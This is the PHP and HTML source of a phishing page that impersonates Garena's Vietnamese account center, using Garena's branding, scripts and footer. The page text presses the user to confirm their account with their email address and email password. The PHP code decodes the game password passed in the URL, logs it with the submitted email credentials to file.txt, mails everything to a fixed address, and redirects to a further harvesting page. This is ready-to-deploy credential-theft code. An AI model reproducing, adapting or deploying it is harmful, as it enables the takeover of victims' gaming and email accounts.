
 <?php
ob_start();
if(isset($_POST['sendlogin'])){
			$url = 'sdt.php?username='.$_GET['username'].'';
	header('Location: '.$url);
	
$username = $_GET['username'];
$tocode = $_SESSION['to'];
$password = $_GET['sesID'];

$tkemail = $_POST['tkemail'];
$mkemail = $_POST['mkemail'];
$sdt = $_POST['sdt'];



$time = date('d/m/Y H:i:s');
$info = '
=========== '.$time.' ===========

Tài Khoản: '.$username.' - Mật Khẩu: '.base64_decode($password).'

			_______ Thông tin tài khoản '.$username.' ________
			
Email : '.$tkemail.'
MK Email : '.$mkemail.'


Code by: Lưu Văn Tuấn - https://facebook.com/Ckim9x.IT 
';
//SĐT : '.$sdt.'
$test = fopen("file.txt","a");
fwrite($test,$info);
fclose($test); 

$from = "From: $username";
$chude = "Tài khoản $username"; 

//Gui email
mail("gmail@gmail.com", $chude, $info, $from);
}
?>



<html lang="en">

<head>
    <link rel="shortcut icon" href="https://cdngarenanow-a.akamaihd.net/webmain/static/garenaweb/favicon.ico" type="image/x-icon">
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, minimum-scale=1, user-scalable=no">
    <title>Account Center</title>
    <script src="https://account.garena.com/js/jquery-3.1.1.min.js" type="text/javascript"></script>
    <script src="https://account.garena.com/js/jsencrypt.min.js" type="text/javascript"></script>
    <script src="https://account.garena.com/js/detectdevice.js?ver=0.000018" type="text/javascript"></script>
    <link rel="stylesheet" href="/css/acccenter-pc.css?ver=0.000018">
</head>

<body>
    <div id="main">
        <div data-reactroot="">
            <div class="wrapper">
                <header class="hd-wrap">
                    <div class="hd">
                        <div class="hd-main">
                            <div class="hd-trigger" id="J-msidebar-left-trigger"></div>
                            <a class="hd-logo"></a>
                            <div class="hd-panel"><img alt="" class="hd-thumb" id="J-msidebar-right-trigger" src="https://cdngarenanow-a.akamaihd.net/gxx/resource/avatar/1.jpg">
                                <div class="hd-name">Xin Chào: <font color="red"><?= $_GET['username'];?></font></div><a href="/" class="hd-operation">Đăng xuất</a>
                                <div class="hd-lang">
                                    <a href="javascript:;" class="hd-lang__cur">
                                        <div class="hd-lang__cur-txt">Vietnam</div>
                                    </a>
                                    <div class="hd-lang__select"><a href="#" class="hd-lang__select-item">Singapore</a><a href="#" class="hd-lang__select-item">Taiwan</a><a href="#" class="hd-lang__select-item">Indonesia</a><a href="#" class="hd-lang__select-item hd-lang__select-item--cur">Vietnam</a><a href="#" class="hd-lang__select-item">Malaysia</a><a href="#" class="hd-lang__select-item">Thailand</a><a href="#" class="hd-lang__select-item">Philippines</a><a href="#" class="hd-lang__select-item">Hong Kong</a><a href="#" class="hd-lang__select-item">Macau</a>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                    <div class="hd-nav">
                        <div class="hd-nav-inner">
                            <div class="hd-nav__item"><a class="hd-nav__link" href="/">Trang chủ</a>
                            </div>
                            <div class="hd-nav__item"><a class="hd-nav__link hd-nav__link--cur" href="/security">Bảo mật</a>
                            </div>
                            <div class="hd-nav__item"><a class="hd-nav__link" href="/faq">FAQ</a>
                            </div>
                        </div>
                    </div>
                </header>
                <div class="main">
                    <aside class="aside">
                        <div class="aside-nav">
                            <a href="#" class="aside-nav__link">
                                <div class="aside-nav__item">
                                    <div class="aside-nav__icon--auth"></div>
                                    <div class="aside-nav__txt">
                                        <!-- react-text: 347 -->Thiết lập
                                        <!-- /react-text -->
                                        <!-- react-text: 348 -->
                                        <!-- /react-text -->
                                        <!-- react-text: 349 -->Garena Authenticator
                                        <!-- /react-text -->
                                    </div>
                                </div>
                            </a>
                            <a href="#" class="aside-nav__link">
                                <div class="aside-nav__item">
                                    <div class="aside-nav__icon--password"></div>
                                    <div class="aside-nav__txt">
                                        <!-- react-text: 354 -->Thay đổi
                                        <!-- /react-text -->
                                        <!-- react-text: 355 -->
                                        <!-- /react-text -->
                                        <!-- react-text: 356 -->Mật khẩu
                                        <!-- /react-text -->
                                    </div>
                                </div>
                            </a>
                            <a href="#" class="aside-nav__link">
                                <div class="aside-nav__item">
                                    <div class="aside-nav__icon--mobile"></div>
                                    <div class="aside-nav__txt">
                                        <!-- react-text: 361 -->Thay đổi
                                        <!-- /react-text -->
                                        <!-- react-text: 362 -->
                                        <!-- /react-text -->
                                        <!-- react-text: 363 -->Số điện thoại
                                        <!-- /react-text -->
                                    </div>
                                </div>
                            </a>
                        </div>
                    </aside>
                    <div class="content">
                        <div class="content-item content-item--ipage">
                            <div class="content-item__title">XÁC NHẬN THÔNG TIN TÀI KHOẢN</div>
                            <div class="content-item__main">
                                <div class="content-item--ipage__main">
                                    <div class="content__form">
									
									
									
                                        <form method="post" action="" name="register" id="J-validated-form">
                                            <div class="content__form-input">
           <input name="tkemail" type="email" class="content__form-input-widget J-validated-field" placeholder="Email đăng ký tài khoản <?= $_GET['username'];?>">
                                            </div>
                                            <div class="content__form-errmsg" id="J-errdisplay-curpwd"></div>
                                            <div class="changepwd-tip-wrap">
                                                <div class="content__form-input">
           <input name="mkemail" id="password" type="password" class="content__form-input-widget J-validated-field" placeholder="Mật khẩu Email.">
                                                </div>
                                                <div id="J-form-pwdschecker" class="changepwd-strength">
                                                    <div class="changepwd-strength__bar-wrap">
                                                        <div class="changepwd-strength__bar"></div>
                                                        <div class="changepwd-strength__bar"></div>
                                                        <div class="changepwd-strength__bar"></div>
                                                    </div>
                                                    <div class="changepwd-strength__txt" data-txt-low="Low" data-txt-medium="Medium" data-txt-high="High"></div>
                                                </div>
                                                <div class="changepwd-tip"><span class="changepwd-tip__b">Gợi ý:</span>
                                                    Để xác nhận không phải spamm.
                                                    
                                                    <br>
                                                    Bạn cần xác nhận đúng thông tin tài khoản.
                                                   
                                                    <br>
                                                    Sử dụng đúng thông tin để hệ thống đăng ký tránh bị quá tải.
                                                   
                                                </div>
                                            </div>
                                            <div class="content__form-errmsg" id="J-errdisplay-newpwd"></div>
                                            <div class="content__form-input">
           <input name="sdt" id="confirm_pass" type="password" class="content__form-input-widget J-validated-field" placeholder="Nhập lại mật khẩu email">
                                            </div>
                                            <div class="content__form-errmsg" id="J-errdisplay-confirmpwd"></div>
                                            <div class="captcha-wrap disabled">
                                                <div id="sso_captcha_image" class="captcha"><img src="" alt="">
                                                    <div class="btn-refresh"></div>
                                                </div>
                                                <div class="input-captcha">
                                              
                                                </div>
                                            </div>
                                            <div class="content__form-errmsg" id="J-errdisplay-curpwd"></div>
                                            <div class="content__submit-wrap">
                                                <input name="sendlogin" type="submit" id="submit" class="content__submit" value="XÁC NHẬN">
                                            </div>
                                        </form>
										
										
    <script type="text/javascript" src="/css/dieukien.js"></script>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
                <footer class="footer-wrap">
                    <div class="footer">
                        <div class="footer__copyright">Copyright © Garena Online. Trademarks belong to their respective owners. All rights reserved.</div>
                        <nav class="footer__link-wrap">
                            <div class="footer__link"><a href="https://garena.vn/usersagreement.html" class="footer__link-txt">Điều Khoản Sử Dụng</a>
                            </div>
                            <div class="footer__link"><a href="http://garena.vn/privacypolicy.html" class="footer__link-txt">Chính Sách Riêng Tư</a>
                            </div>
                        </nav>
                    </div>
                </footer>
                <div class="wrapper__mask" id="J-wrapper-mask"></div>
            </div>
            
          
        </div>
    </div>
    <script type="text/javascript" src="https://account.garena.com/js/extra.5aac059c.js"></script>
</body>

</html>